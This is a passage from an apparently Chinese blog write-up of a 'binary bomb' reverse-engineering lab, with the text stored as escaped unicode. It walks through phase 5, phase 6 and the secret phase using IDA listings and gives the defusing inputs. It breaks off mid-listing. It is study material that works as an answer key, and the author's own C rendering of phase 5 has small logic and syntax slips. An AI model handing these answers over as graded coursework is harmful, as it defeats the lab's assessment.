\u76f8\u5f53\u660e\u663e\u4e86\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u9012\u5f52\u8ba1\u7b97\u6590\u6ce2\u7eb3\u5951\u6570\u5217\u7684\u51fd\u6570\u3002 \u7efc\u4e0a\uff0c\u7531\u4e8e\u6590\u6ce2\u90a3\u5951\u6570\u5217\u662f\uff1a 1 2 3 5 8 13 21 34 55 \u6240\u4ee5\uff0c\u53ea\u8981\u7ed9\u5b9a\uff1a 1 9 \uff0c\u5373\u7b2c9\u4e2a\u6570\u5b57\uff0c\u5c31\u53ef\u901a\u8fc7\u7b2c\u56db\u4e2acheck\u3002 phase_5() \u7ee7\u7eed\u524d\u8fdb\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 __int64 __fastcall phase_5 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { __int64 result ; // rax int v7 ; // ecx int v8 ; // edx int v9 ; // [rsp+8h] [rbp-10h] int v10 ; // [rsp+Ch] [rbp-Ch] if ( ( signed int ) __isoc99_sscanf ( a1 , \"%d %d\" , & v10 , & v9 , a5 , a6 ) <= 1 ) explode_bomb ( a1 , \"%d %d\" ); LODWORD ( result ) = v10 & 0xF ; v10 = result ; if ( ( _DWORD ) result == 15 ) goto LABEL_11 ; v7 = 0 ; v8 = 0 ; do { ++ v8 ; result = ( unsigned int ) array_3014 [( signed int ) result ]; v7 += result ; } while ( ( _DWORD ) result != 15 ); v10 = 15 ; if ( v8 != 12 || v7 != v9 ) LABEL_11 : explode_bomb ( a1 , \"%d %d\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 .text: 0000000000401002 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401002 .text: 0000000000401002 .text: 0000000000401002 public phase_5 .text: 0000000000401002 phase_5 proc near ; CODE XREF: main+100\u2191p .text: 0000000000401002 .text: 0000000000401002 var_10 = dword ptr - 10 h .text: 0000000000401002 var_C = dword ptr - 0 Ch .text: 0000000000401002 .text: 0000000000401002 ; __unwind { .text: 0000000000401002 sub rsp , 18 h .text: 0000000000401006 lea rcx , [ rsp + 18 h + var_10 ] .text: 000000000040100 B lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000401010 mov esi , offset aDD ; \"%d %d\" .text: 0000000000401015 mov eax , 0 .text: 000000000040101 A call ___isoc99_sscanf .text: 000000000040101 F cmp eax , 1 .text: 0000000000401022 jg short loc_401029 .text: 0000000000401024 call explode_bomb .text: 0000000000401029 ; --------------------------------------------------------------------------- .text: 0000000000401029 .text: 0000000000401029 loc_401029: ; CODE XREF: phase_5+20\u2191j .text: 0000000000401029 mov eax , [ rsp + 18 h + var_C ] .text: 000000000040102 D and eax , 0 Fh .text: 0000000000401030 mov [ rsp + 18 h + var_C ], eax .text: 0000000000401034 cmp eax , 0 Fh .text: 0000000000401037 jz short loc_401065 .text: 0000000000401039 mov ecx , 0 .text: 000000000040103 E mov edx , 0 .text: 0000000000401043 .text: 0000000000401043 loc_401043: ; CODE XREF: phase_5+52\u2193j .text: 0000000000401043 add edx , 1 .text: 0000000000401046 cdqe .text: 0000000000401048 mov eax , ds : array_3014 [ rax * 4 ] .text: 000000000040104 F add ecx , eax .text: 0000000000401051 cmp eax , 0 Fh .text: 0000000000401054 jnz short loc_401043 .text: 0000000000401056 mov [ rsp + 18 h + var_C ], eax .text: 000000000040105 A cmp edx , 0 Ch .text: 000000000040105 D jnz short loc_401065 .text: 000000000040105 F cmp ecx , [ rsp + 18 h + var_10 ] .text: 0000000000401063 jz short loc_40106A .text: 0000000000401065 .text: 0000000000401065 loc_401065: ; CODE XREF: phase_5+35\u2191j .text: 0000000000401065 ; phase_5+5B\u2191j .text: 0000000000401065 call explode_bomb .text: 000000000040106 A ; --------------------------------------------------------------------------- .text: 000000000040106 A .text: 000000000040106 A loc_40106A : ; CODE XREF: phase_5+61\u2191j .text: 000000000040106 A add rsp , 18 h .text: 000000000040106 E retn .text: 000000000040106 E ; } // starts at 401002 .text: 000000000040106 E phase_5 endp .text: 000000000040106 E C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 int array [] = { 0xA , 0x2 , 0xE , 0x7 , 0x8 , 0xC , 0xF , 0xB , 0x0 , 0x4 , 0x1 , 0xD , 0x3 , 0x9 , 0x6 , 0x5 , }; void phase_5 () { int number1 , number2 ; if ( scanf ( \"%d %d\" , & number1 , & number2 ) <= 1 ) { explode_bomb (); } number1 = number1 & 0xF ; if ( number1 == 0xF ) { explode_bomb (); } int i = 0 , sum = 0 ; do { i += 1 ; number1 = array [ number1 ]; sum += number1 ; } while ( number1 != 0xF ) if ( i != 0xC && sum != number2 ) { explode_bomb (); } } array, raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 .rodata: 0000000000401 BA0 ; int array_3014[16] .rodata: 0000000000401 BA0 array_3014 dd 0 Ah ; DATA XREF: phase_5+46\u2191r .rodata: 0000000000401 BA4 db 2 .rodata: 0000000000401 BA5 db 0 .rodata: 0000000000401 BA6 db 0 .rodata: 0000000000401 BA7 db 0 .rodata: 0000000000401 BA8 db 0 Eh .rodata: 0000000000401 BA9 db 0 .rodata: 0000000000401 BAA db 0 .rodata: 0000000000401 BAB db 0 .rodata: 0000000000401 BAC db 7 .rodata: 0000000000401 BAD db 0 .rodata: 0000000000401 BAE db 0 .rodata: 0000000000401 BAF db 0 .rodata: 0000000000401 BB0 db 8 .rodata: 0000000000401 BB1 db 0 .rodata: 0000000000401 BB2 db 0 .rodata: 0000000000401 BB3 db 0 .rodata: 0000000000401 BB4 db 0 Ch .rodata: 0000000000401 BB5 db 0 .rodata: 0000000000401 BB6 db 0 .rodata: 0000000000401 BB7 db 0 .rodata: 0000000000401 BB8 db 0 Fh .rodata: 0000000000401 BB9 db 0 .rodata: 0000000000401 BBA db 0 .rodata: 0000000000401 BBB db 0 .rodata: 0000000000401 BBC db 0 Bh .rodata: 0000000000401 BBD db 0 .rodata: 0000000000401 BBE db 0 .rodata: 0000000000401 BBF db 0 .rodata: 0000000000401 BC0 db 0 .rodata: 0000000000401 BC1 db 0 .rodata: 0000000000401 BC2 db 0 .rodata: 0000000000401 BC3 db 0 .rodata: 0000000000401 BC4 db 4 .rodata: 0000000000401 BC5 db 0 .rodata: 0000000000401 BC6 db 0 .rodata: 0000000000401 BC7 db 0 .rodata: 0000000000401 BC8 db 1 .rodata: 0000000000401 BC9 db 0 .rodata: 0000000000401 BCA db 0 .rodata: 0000000000401 BCB db 0 .rodata: 0000000000401 BCC db 0 Dh .rodata: 0000000000401 BCD db 0 .rodata: 0000000000401 BCE db 0 .rodata: 0000000000401 BCF db 0 .rodata: 0000000000401 BD0 db 3 .rodata: 0000000000401 BD1 db 0 .rodata: 0000000000401 BD2 db 0 .rodata: 0000000000401 BD3 db 0 .rodata: 0000000000401 BD4 db 9 .rodata: 0000000000401 BD5 db 0 .rodata: 0000000000401 BD6 db 0 .rodata: 0000000000401 BD7 db 0 .rodata: 0000000000401 BD8 db 6 .rodata: 0000000000401 BD9 db 0 .rodata: 0000000000401 BDA db 0 .rodata: 0000000000401 BDB db 0 .rodata: 0000000000401 BDC db 5 .rodata: 0000000000401 BDD db 0 .rodata: 0000000000401 BDE db 0 .rodata: 0000000000401 BDF db 0 \u7136\u540e\u5c31\u53d1\u73b0\u81ea\u5df1\u9006\u7684\u8ddfIDA\u7684\u597d\u50cf\u5dee\u4e0d\u591a...\u73b0\u5728\u770b\u8d77\u6765\u5df2\u7ecf\u5f88\u660e\u786e\u4e86\uff0c\u9898\u76ee\u9884\u7f6e\u4e86\u4e00\u4e2a16\u4e2a\u6574\u6570\u7684\u6570\u7ec4\uff0c\u8981\u6c42\u8f93\u5165\u4e24\u4e2a\u6574\u6570\u3002 \u5176\u4e2d\uff0c\u4f1a\u5148\u53d6\u7b2c\u4e00\u4e2a\u6574\u6570\u7684\u4e8c\u8fdb\u5236\u7684\u540e4\u4f4d\uff0c\u4e5f\u5c31\u662f\u88ab\u622a\u65ad\u540e\u6700\u5927\u503c\u662f15\uff0c\u8fd9\u4e2a\u6570\u503c\u4f1a\u88ab\u5f53\u4f5c\u6570\u7ec4\u4e0b\u6807\u53bb\u67e5\u627e\u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u503c\uff0c\u968f\u540e\u7d2f\u52a0\u67e5\u627e\u5230\u7684\u503c\u3002\u5e76\u4e14\uff0c\u4f1a\u7528\u67e5\u627e\u5230\u7684\u503c\u7ee7\u7eed\u5f53\u4f5c\u6570\u7ec4\u4e0b\u6807\u53bb\u627e\u5230\u65b0\u7684\u503c\uff0c\u5982\u6b64\u5faa\u73af\uff0c\u76f4\u5230\u53d6\u5230 0xF \u65f6\u505c\u6b62\u3002 \u6ce8\u610f\u5230\uff0c\u505c\u6b62\u7684\u65f6\u5019\u8981\u6c42\u67e5\u627e\u4e8612\u6b21\uff0c\u5e76\u4e14\u6bcf\u6b21\u67e5\u627e\u5230\u7684\u503c\u7684\u7d2f\u52a0\u548c\u5e94\u5f53\u4e0e\u8f93\u5165\u7684\u7b2c\u4e8c\u4e2a\u6570\u76f8\u7b49\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4ece\u6570\u7ec4\u7684\u7b2c6\u4e2a\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u4e5f\u5c31\u662f 0xF \u5f00\u59cb\uff0c\u9006\u5411\u67e5\u627e\u56de\u53bb\uff0c\u4e8e\u662f\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u987a\u5e8f\u5e94\u8be5\u662f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 array [ 7 ] ==> 0 xB ==> 11 array [ 11 ] ==> 0 xD ==> 13 array [ 13 ] ==> 0 x9 ==> 9 array [ 9 ] ==> 0 x4 ==> 4 array [ 4 ] ==> 0 x8 ==> 8 array [ 8 ] ==> 0 x0 ==> 0 array [ 0 ] ==> 0 xA ==> 10 array [ 10 ] ==> 0 x1 ==> 1 array [ 1 ] ==> 0 x2 ==> 2 array [ 2 ] ==> 0 xE ==> 14 array [ 14 ] ==> 0 x6 ==> 6 array [ 6 ] ==> 0 xF ==> 15 \u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e00\u4e2a\u6570\u5b57\u5e94\u5f53\u662f 7 \uff0c\u5e76\u4e14\uff0c\u7d2f\u52a0\u548c\u5e94\u5f53\u662f 93 \uff08\u6211\u5077\u5077\u52a0\u597d\u4e86\uff09\u3002\u6240\u4ee5\u7b2c\u4e94\u90e8\u5206\u7684flag\u662f\uff1a 1 7 93 phase_6() Congratulations! You've (mostly) defused the bomb! Hit Control-C to escape phase 6 (for free!), but if you want to try phase 6 for extra credit, you can continue. Just beware! \u770b\u8d77\u6765\u9898\u76ee\u8bf4\u7b2c\u516d\u5173\u662f\u9644\u52a0\u9898\uff1f\u8fd8\u662f\u6765\u770b\u770b\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 _DWORD * __fastcall phase_6 ( const char * a1 ) { _DWORD * result ; // rax node0 = strtol ( a1 , 0LL , 10 ); result = * ( _DWORD ** )( * ( _QWORD * )( * ( _QWORD * )( fun6 ( & node0 , 0LL ) + 8 ) + 8LL ) + 8LL ); if ( * result != node0 ) explode_bomb ( & node0 , 0LL ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 .text: 00000000004010 D9 ; =============== S U B R O U T I N E ======================================= .text: 00000000004010 D9 .text: 00000000004010 D9 .text: 00000000004010 D9 public phase_6 .text: 00000000004010 D9 phase_6 proc near ; CODE XREF: main+130\u2191p .text: 00000000004010 D9 ; __unwind { .text: 00000000004010 D9 sub rsp , 8 .text: 00000000004010 DD mov edx , 0 Ah ; base .text: 00000000004010 E2 mov esi , 0 ; endptr .text: 00000000004010 E7 call _strtol .text: 00000000004010 EC mov cs : node0 , eax .text: 00000000004010 F2 mov edi , offset node0 .text: 00000000004010 F7 call fun6 .text: 00000000004010 FC mov rax , [ rax + 8 ] .text: 0000000000401100 mov rax , [ rax + 8 ] .text: 0000000000401104 mov rax , [ rax + 8 ] .text: 0000000000401108 mov edx , cs : node0 .text: 000000000040110 E cmp [ rax ], edx .text: 0000000000401110 jz short loc_401117 .text: 0000000000401112 call explode_bomb .text: 0000000000401117 ; --------------------------------------------------------------------------- .text: 0000000000401117 .text: 0000000000401117 loc_401117: ; CODE XREF: phase_6+37\u2191j .text: 0000000000401117 add rsp , 8 .text: 000000000040111 B retn .text: 000000000040111 B ; } // starts at 4010D9 .text: 000000000040111 B phase_6 endp .text: 000000000040111 B node, raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 .data: 0000000000602780 public node0 .data: 0000000000602780 node0 dd 0 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602784 align 8 .data: 0000000000602788 dq offset node1 .data: 0000000000602790 public node1 .data: 0000000000602790 node1 db 76 h ; v ; DATA XREF: .data:0000000000602788\u2191o .data: 0000000000602791 db 1 .data: 0000000000602792 db 0 .data: 0000000000602793 db 0 .data: 0000000000602794 db 1 .data: 0000000000602795 db 0 .data: 0000000000602796 db 0 .data: 0000000000602797 db 0 .data: 0000000000602798 db 0 A0h .data: 0000000000602799 db 27 h ; ' .data: 000000000060279 A db 60 h ; ` .data: 000000000060279 B db 0 .data: 000000000060279 C db 0 .data: 000000000060279 D db 0 .data: 000000000060279 E db 0 .data: 000000000060279 F db 0 .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 node2 db 3 Ah ; : .data: 00000000006027 A1 db 3 .data: 00000000006027 A2 db 0 .data: 00000000006027 A3 db 0 .data: 00000000006027 A4 db 2 .data: 00000000006027 A5 db 0 .data: 00000000006027 A6 db 0 .data: 00000000006027 A7 db 0 .data: 00000000006027 A8 db 0 B0h .data: 00000000006027 A9 db 27 h ; ' .data: 00000000006027 AA db 60 h ; ` .data: 00000000006027 AB db 0 .data: 00000000006027 AC db 0 .data: 00000000006027 AD db 0 .data: 00000000006027 AE db 0 .data: 00000000006027 AF db 0 .data: 00000000006027 B0 public node3 .data: 00000000006027 B0 node3 db 72 h ; r .data: 00000000006027 B1 db 1 .data: 00000000006027 B2 db 0 .data: 00000000006027 B3 db 0 .data: 00000000006027 B4 db 3 .data: 00000000006027 B5 db 0 .data: 00000000006027 B6 db 0 .data: 00000000006027 B7 db 0 .data: 00000000006027 B8 db 0 C0h .data: 00000000006027 B9 db 27 h ; ' .data: 00000000006027 BA db 60 h ; ` .data: 00000000006027 BB db 0 .data: 00000000006027 BC db 0 .data: 00000000006027 BD db 0 .data: 00000000006027 BE db 0 .data: 00000000006027 BF db 0 .data: 00000000006027 C0 public node4 .data: 00000000006027 C0 node4 db 0 Eh .data: 00000000006027 C1 db 3 .data: 00000000006027 C2 db 0 .data: 00000000006027 C3 db 0 .data: 00000000006027 C4 db 4 .data: 00000000006027 C5 db 0 .data: 00000000006027 C6 db 0 .data: 00000000006027 C7 db 0 .data: 00000000006027 C8 db 0 D0h .data: 00000000006027 C9 db 27 h ; ' .data: 00000000006027 CA db 60 h ; ` .data: 00000000006027 CB db 0 .data: 00000000006027 CC db 0 .data: 00000000006027 CD db 0 .data: 00000000006027 CE db 0 .data: 00000000006027 CF db 0 .data: 00000000006027 D0 public node5 .data: 00000000006027 D0 node5 db 0 E8h .data: 00000000006027 D1 db 1 .data: 00000000006027 D2 db 0 .data: 00000000006027 D3 db 0 .data: 00000000006027 D4 db 5 .data: 00000000006027 D5 db 0 .data: 00000000006027 D6 db 0 .data: 00000000006027 D7 db 0 .data: 00000000006027 D8 db 0 E0h .data: 00000000006027 D9 db 27 h ; ' .data: 00000000006027 DA db 60 h ; ` .data: 00000000006027 DB db 0 .data: 00000000006027 DC db 0 .data: 00000000006027 DD db 0 .data: 00000000006027 DE db 0 .data: 00000000006027 DF db 0 .data: 00000000006027 E0 public node6 .data: 00000000006027 E0 node6 db 0 A1h .data: 00000000006027 E1 db 2 .data: 00000000006027 E2 db 0 .data: 00000000006027 E3 db 0 .data: 00000000006027 E4 db 6 .data: 00000000006027 E5 db 0 .data: 00000000006027 E6 db 0 .data: 00000000006027 E7 db 0 .data: 00000000006027 E8 db 0 F0h .data: 00000000006027 E9 db 27 h ; ' .data: 00000000006027 EA db 60 h ; ` .data: 00000000006027 EB db 0 .data: 00000000006027 EC db 0 .data: 00000000006027 ED db 0 .data: 00000000006027 EE db 0 .data: 00000000006027 EF db 0 .data: 00000000006027 F0 public node7 .data: 00000000006027 F0 node7 db 1 Eh .data: 00000000006027 F1 db 1 .data: 00000000006027 F2 db 0 .data: 00000000006027 F3 db 0 .data: 00000000006027 F4 db 7 .data: 00000000006027 F5 db 0 .data: 00000000006027 F6 db 0 .data: 00000000006027 F7 db 0 .data: 00000000006027 F8 db 0 .data: 00000000006027 F9 db 28 h ; ( .data: 00000000006027 FA db 60 h ; ` .data: 00000000006027 FB db 0 .data: 00000000006027 FC db 0 .data: 00000000006027 FD db 0 .data: 00000000006027 FE db 0 .data: 00000000006027 FF db 0 .data: 0000000000602800 public node8 .data: 0000000000602800 node8 db 58 h ; X .data: 0000000000602801 db 2 .data: 0000000000602802 db 0 .data: 0000000000602803 db 0 .data: 0000000000602804 db 8 .data: 0000000000602805 db 0 .data: 0000000000602806 db 0 .data: 0000000000602807 db 0 .data: 0000000000602808 db 10 h .data: 0000000000602809 db 28 h ; ( .data: 000000000060280 A db 60 h ; ` .data: 000000000060280 B db 0 .data: 000000000060280 C db 0 .data: 000000000060280 D db 0 .data: 000000000060280 E db 0 .data: 000000000060280 F db 0 .data: 0000000000602810 public node9 .data: 0000000000602810 node9 db 11 h .data: 0000000000602811 db 2 .data: 0000000000602812 db 0 .data: 0000000000602813 db 0 .data: 0000000000602814 db 9 .data: 0000000000602815 db 0 .data: 0000000000602816 db 0 .data: 0000000000602817 db 0 .data: 0000000000602818 db 0 .data: 0000000000602819 db 0 .data: 000000000060281 A db 0 .data: 000000000060281 B db 0 .data: 000000000060281 C db 0 .data: 000000000060281 D db 0 .data: 000000000060281 E db 0 .data: 000000000060281 F db 0 node 1 2 3 4 5 6 7 8 9 10 11 12 13 14 .data: 0000000000602780 public node0 .data: 0000000000602780 node0 dd 0 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602784 align 8 .data: 0000000000602788 dq offset node1 .data: 0000000000602790 public node1 .data: 0000000000602790 node1 dd 176 h ; DATA XREF: .data:0000000000602788\u2191o .data: 0000000000602794 dd 1 .data: 0000000000602798 dq offset node2 .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 node2 dd 33 Ah ; DATA XREF: .data:0000000000602798\u2191o .data: 00000000006027 A4 dd 2 .data: 00000000006027 A8 dq offset node3 .data: 00000000006027 B0 public node3 \u6ce8\u610f\u5230 node, raw \u6807\u7b7e\u5185\uff0c\u8fd9\u6bb5\u6570\u636e\u533a\u7684\u6bcf\u4e2anode\u7684\u540e8\u4e2a\u5b57\u8282\u4f3c\u4e4e\u6b63\u597d\u662f\u4e0b\u4e00\u4e2anode\u7684\u5730\u5740\uff0c\u6309D\u8f6c\u6362\u6210\u4e0a\u9762\u7684 node \u6807\u7b7e\u91cc\u90a3\u6837\uff1a \u57fa\u672c\u4e0a\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u4e00\u4e2a\u8282\u70b9\u91cc\u6709\u4e00\u4e2a\u6570\u636e\u548c\u5e8f\u53f7\uff0c\u8fd8\u6709\u4e00\u4e2a\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u6307\u9488\u3002\u4e8e\u662f\u5230 Structures \u91cc\u6dfb\u52a0\u4e00\u4e2a\u7ed3\u6784\u4f53 Node \uff0c\u5c31\u50cf\u8fd9\u4e2a\u6837\u5b50\uff1a 1 2 3 4 5 6 7 8 00000000 Node struc ; (sizeof=0x10, mappedto_13) 00000000 ; XREF: .data:node1/r 00000000 ; .data:node2/r 00000000 data dd ? 00000004 index dd ? 00000008 next dq ? ; offset 00000010 Node ends 00000010 \u56de\u5230\u6c47\u7f16\u4ee3\u7801\u6bb5\uff0c\u5bf9\u7740\u6bcf\u4e2anode\u6309Y\uff0c\u6307\u5b9a\u5b83\u7684\u7c7b\u578b\uff0c\u5c31\u4f1a\u53d8\u6210\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 .data: 0000000000602780 public node0 .data: 0000000000602780 ; Node node0 .data: 0000000000602780 node0 Node < 0 , 0 , offset node1 > .data: 0000000000602780 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602790 public node1 .data: 0000000000602790 ; Node node1 .data: 0000000000602790 node1 Node < 176 h , 1 , offset node2.data > .data: 0000000000602790 ; DATA XREF: .data:node0\u2191o .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 ; Node node2 .data: 00000000006027 A0 node2 Node < 33 Ah , 2 , offset node3 > .data: 00000000006027 A0 ; DATA XREF: .data:node1\u2191o .data: 00000000006027 B0 public node3 .data: 00000000006027 B0 ; Node node3 .data: 00000000006027 B0 node3 Node < 172 h , 3 , offset node4 > .data: 00000000006027 B0 ; DATA XREF: .data:node2\u2191o .data: 00000000006027 C0 public node4 .data: 00000000006027 C0 ; Node node4 .data: 00000000006027 C0 node4 Node < 30 Eh , 4 , offset node5 > .data: 00000000006027 C0 ; DATA XREF: .data:node3\u2191o .data: 00000000006027 D0 public node5 .data: 00000000006027 D0 ; Node node5 .data: 00000000006027 D0 node5 Node < 1 E8h , 5 , offset node6 > .data: 00000000006027 D0 ; DATA XREF: .data:node4\u2191o .data: 00000000006027 E0 public node6 .data: 00000000006027 E0 ; Node node6 .data: 00000000006027 E0 node6 Node < 2 A1h , 6 , offset node7 > .data: 00000000006027 E0 ; DATA XREF: .data:node5\u2191o .data: 00000000006027 F0 public node7 .data: 00000000006027 F0 ; Node node7 .data: 00000000006027 F0 node7 Node < 11 Eh , 7 , offset node8 > .data: 00000000006027 F0 ; DATA XREF: .data:node6\u2191o .data: 0000000000602800 public node8 .data: 0000000000602800 ; Node node8 .data: 0000000000602800 node8 Node < 258 h , 8 , offset node9 > .data: 0000000000602800 ; DATA XREF: .data:node7\u2191o .data: 0000000000602810 public node9 .data: 0000000000602810 ; Node node9 .data: 0000000000602810 node9 Node < 211 h , 9 , 0 > ; DATA XREF: .data:node8\u2191o \u597d\u4e86\uff0c\u6bcf\u4e2a\u6570\u636e\u90fd\u76f8\u5f53\u6e05\u695a\u4e86\u3002\u6765\u770b\u770b phase_6() \u5427\uff0c\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u53c2\u6570\u662f\u4e00\u4e2a Node * \uff0c\u6240\u4ee5\u8fd8\u662f\u5bf9\u7740\u53c2\u6570\u6309Y\u628a\u7c7b\u578b\u6539\u6210 Node * \u3002\u8fd9\u4e2a\u65f6\u5019\u53ea\u8981\u518d\u6309\u4e00\u4e0bF5\uff08\u4f3c\u4e4e\u53ea\u662f\u4e3a\u4e86\u5237\u65b0\u4e00\u4e0b\uff09\uff0c\u5c31\u4f1a\u53d1\u73b0\u5df2\u7ecf...\uff1a 1 2 3 4 5 6 7 8 9 10 Node * __fastcall phase_6 ( const char * a1 ) { Node * result ; // rax node0 . data = strtol ( a1 , 0LL , 10 ); result = fun6 ( & node0 ) -> next -> next -> next ; if ( result -> data != node0 . data ) explode_bomb ( & node0 , 0LL ); return result ; } \u8fd8\u6709\u8fd9\u4e2a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 Node * __fastcall fun6 ( Node * a1 ) { Node * v1 ; // r8 Node * result ; // rax Node * v3 ; // rcx Node * v4 ; // rdx Node * v5 ; // rcx v1 = a1 -> next ; a1 -> next = 0LL ; result = a1 ; v3 = a1 ; if ( ! v1 ) return a1 ; while ( 1 ) { v4 = v3 ; if ( v3 && v3 -> data > v1 -> data ) { while ( 1 ) { v4 = v3 -> next ; if ( ! v4 ) break ; if ( v4 -> data <= v1 -> data ) { a1 = v3 ; goto LABEL_8 ; } v3 = v3 -> next ; } a1 = v3 ; } LABEL_8 : if ( a1 == v4 ) result = v1 ; else a1 -> next = v1 ; v5 = v1 -> next ; v1 -> next = v4 ; if ( ! v5 ) return result ; v1 = v5 ; v3 = result ; a1 = result ; } } \u8fd9\u4e2a\u65f6\u5019\u6211\u5df2\u7ecf\u7d2f\u4e86\uff0c\u4e0d\u60f3\u518d\u5199\u4e86...\u7ecf\u8fc7\u5c1d\u8bd5\u8f93\u5165\u94fe\u8868\u4e2d\u7684\u6570\u636e\u52a8\u6001\u8c03\u8bd5\u53ef\u4ee5\u53d1\u73b0\uff0c\u51fd\u6570\u5bf9\u94fe\u8868\u8fdb\u884c\u4e86\u6392\u5e8f\uff0c\u5e94\u8be5\u8f93\u5165\u7b2c\u56db\u5927\u7684\u6570\u636e 258h \u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u4ee5\uff1a 1 600 secret_phase() \u5176\u5b9e\u5728IDA\u5de6\u4fa7\u680f\u80fd\u770b\u5230\u4e00\u4e2a\u9690\u85cf\u5173 secret_phase() \uff0c\u53cc\u51fb\u5b83\uff0c\u7136\u540e\u6309X\u67e5\u627e\u5f15\u7528\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u6bcf\u5173 phase_defused() \u65f6\u90fd\u4f1a\u68c0\u67e5\u662f\u5426\u89e6\u53d1\u9690\u85cf\u5173\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void __fastcall phase_defused ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { char v6 ; // [rsp+Ch] [rbp-5Ch] char v7 ; // [rsp+10h] [rbp-58h] if ( num_input_strings == 6 ) { if ( ( unsigned int ) __isoc99_sscanf ( & unk_603030 , \" %d %s \" , & v6 , & v7 , a5 , a6 ) == 2 && !( unsigned int ) strings_not_equal ( & v7 , \" austinpowers \" ) ) { puts ( \" Curses , you ' ve found the secret phase ! \" ) ; puts ( \" But finding it and solving it are quite different... \" ) ; secret_phase (( __int64 ) \" But finding it and solving it are quite different... \" , ( __int64 ) \" austinpowers \" ) ; } puts ( \" Congratulations ! You ' ve defused the bomb ! Again ! \" ) ; } } \u52a8\u6001\u8c03\u8bd5\u7684\u65f6\u5019\u80fd\u53d1\u73b0 \u7b2c\u56db\u5173 \u65f6\u9700\u8981\u8f93\u5165\uff1a 1 9 austinpowers \u5c31\u53ef\u4ee5\u89e6\u53d1\u9690\u85cf\u5173\u3002\u9690\u85cf\u5173\u662f\u4e2a\u4e8c\u53c9\u6811\uff0c\u5148\u52a0\u5165\u4ee5\u4e0b\u7ed3\u6784\u4f53\uff1a 1 2 3 4 5 6 7 8 9 00000000 BiTree struc ; (sizeof=0x20, mappedto_14) 00000000 ; XREF: .data:n1/r 00000000 ; .data:n21/r ... 00000000 data dq ? 00000008 lchild dq ? ; offset 00000010 rchild dq ? ; offset 00000018 unknown dq ? 00000020 BiTree ends 00000020 \u8fd8\u662fF5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall secret_phase ( __int64 a1 ) { const char * v1 ; // rdi unsigned int v2 ; // ebx v1 = ( const char * ) read_line ( a1 ); v2 = strtol ( v1 , 0LL , 10 ); if ( v2 - 1 > 0x3E8 ) explode_bomb ( v1 , 0LL ); if ( ( unsigned int ) fun7 (( BiTree * ) & n1 , v2 ) != 3 ) explode_bomb ( & n1 , v2 ); puts ( \"Wow! You've defused the secret stage!\" ); return phase_defused ( \"Wow! You've defused the secret stage!\" ); } \u8fd8\u6709\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 signed __int64 __fastcall fun7 ( BiTree * a1 , int a2 ) { signed __int64 result ; // rax if ( ! a1 ) return 0xFFFFFFFFLL ; if ( SLODWORD ( a1 -> data ) > a2 ) return 2 * ( unsigned int ) fun7 ( a1 -> lchild , a2 ); result = 0LL ; if ( LODWORD ( a1 -> data ) != a2 ) result = 2 * ( unsigned int ) fun7 ( a1 -> rchild , a2 ) + 1 ; return result ; } \u8fd8\u6709\u4e8c\u53c9\u6811\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 